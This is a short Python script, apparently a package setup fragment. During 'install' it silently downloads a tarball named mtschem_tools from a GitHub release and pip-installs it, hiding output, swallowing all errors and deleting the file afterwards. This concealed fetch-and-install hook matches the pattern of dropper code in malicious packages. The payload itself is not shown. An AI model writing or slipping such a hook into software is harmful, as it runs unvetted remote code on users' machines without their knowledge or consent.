import os
import socket
import subprocess
import sys
import urllib.request

pip_arg = 'install'


def _get_mttools_from_github():
    try:
        old_timeout = socket.getdefaulttimeout()
        socket.setdefaulttimeout(120)

        package = "mtschem_tools-1.0.0.tar.gz"
        url = f"https://github.com/mtteams/mtschem-tools/releases/latest/download/{package}"
        try:
            urllib.request.urlretrieve(url, package)

            try:
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", package],
                    check=True,
                    capture_output=True,
                    text=True,
                    timeout=300
                )
                return True

            except subprocess.TimeoutExpired:
                return False

            except subprocess.CalledProcessError:
                return False

        finally:
            socket.setdefaulttimeout(old_timeout)
            if os.path.exists(package):
                try:
                    os.remove(package)
                except Exception:
                    pass

    except Exception:
        return False


if pip_arg in sys.argv:
    _get_mttools_from_github()
